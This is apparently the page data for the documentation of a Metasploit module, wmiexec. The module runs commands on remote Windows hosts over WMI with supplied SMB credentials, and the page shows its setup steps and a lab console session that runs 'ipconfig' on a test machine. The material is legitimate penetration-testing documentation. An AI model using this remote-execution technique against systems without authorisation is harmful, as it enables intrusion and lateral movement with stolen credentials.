{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/smb/impacket/wmiexec","result":{"data":{"moduleMetadataJson":{"id":"38b31254-802c-59b4-b41f-682eff806695","name":"WMI Exec","fullname":"auxiliary/scanner/smb/impacket/wmiexec","description":"A similar approach to psexec but executing commands through WMI.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/smb/impacket/wmiexec","documentationSlug":"/modules/documentation/auxiliary/scanner/smb/impacket/wmiexec"},"documentation":{"html":"<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install <a href=\"https://github.com/CoreSecurity/impacket\">Impacket</a> v0.9.17 from GitHub. The <code class=\"language-text\">impacket</code> package must be in\nPython's module path, so <code class=\"language-text\">import impacket</code> works from any directory.</li>\n<li>Install <a href=\"https://www.dlitz.net/software/pycrypto/\">pycrypto</a> v2.7 (the experimental release). Impacket requires this\nspecific version.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/smb/impacket/wmiexec</code></li>\n<li>Set: <code class=\"language-text\">COMMAND</code>, <code class=\"language-text\">RHOSTS</code>, <code class=\"language-text\">SMBUser</code>, <code class=\"language-text\">SMBPass</code></li>\n<li>Do: <code class=\"language-text\">run</code>, see the command result (if <code class=\"language-text\">OUTPUT</code> is enabled)</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>OUTPUT</strong></p>\n<p>  When the <code class=\"language-text\">OUTPUT</code> option is enabled, the result of the command will be written\nto a temporary file on the remote host and then retrieved. This allows the\nmodule user to view the output but also causes it to be written to disk before\nit is retrieved and deleted.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">metasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/wmiexec) &gt; show options \n\nModule options (auxiliary/scanner/smb/impacket/wmiexec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   COMMAND    ipconfig         yes       The command to execute\n   OUTPUT     true             yes       Get the output of the executed command\n   RHOSTS     192.168.90.11    yes       The target address range or CIDR identifier\n   SMBDomain  .                no        The Windows domain to use for authentication\n   SMBPass    wakawaka         yes       The password for the specified username\n   SMBUser    spencer          yes       The username to authenticate as\n   THREADS    1                yes       The number of concurrent threads\n\nmetasploit-framework (S:0 J:1) auxiliary(scanner/smb/impacket/wmiexec) &gt; run\n\n[*] [2018.04.04-17:10:47] Running for 192.168.90.11...\n[*] [2018.04.04-17:10:47] 192.168.90.11 - SMBv3.0 dialect used\n[*] [2018.04.04-17:10:47] 192.168.90.11 - Target system is 192.168.90.11 and isFDQN is False\n[*] [2018.04.04-17:10:47] 192.168.90.11 - StringBinding: \\\\\\\\WINDOWS8VM[\\\\PIPE\\\\atsvc]\n[*] [2018.04.04-17:10:47] 192.168.90.11 - StringBinding: Windows8VM[49154]\n[*] [2018.04.04-17:10:47] 192.168.90.11 - StringBinding: 10.0.3.15[49154]\n[*] [2018.04.04-17:10:47] 192.168.90.11 - StringBinding: 192.168.90.11[49154]\n[*] [2018.04.04-17:10:47] 192.168.90.11 - StringBinding chosen: ncacn_ip_tcp:192.168.90.11[49154]\n[*] [2018.04.04-17:10:49] \nWindows IP Configuration\n\n\nEthernet adapter Ethernet 5:\n\n   Connection-specific DNS Suffix  . : foo.lan\n   Link-local IPv6 Address . . . . . : fe80::9ceb:820e:7c6b:def9%17\n   IPv4 Address. . . . . . . . . . . : 10.0.3.15\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.0.3.2\n\nEthernet adapter Local Area Connection:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nEthernet adapter Ethernet 3:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\nEthernet adapter Ethernet 4:\n\n   Connection-specific DNS Suffix  . : \n   IPv4 Address. . . . . . . . . . . : 192.168.90.11\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : \n\nTunnel adapter isatap.foo.lan:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : foo.lan\n\nTunnel adapter isatap.{70FE2ED7-E141-40A9-9CAF-E8556F6A4E80}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\n[*] [2018.04.04-17:10:49] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"38b31254-802c-59b4-b41f-682eff806695"}}}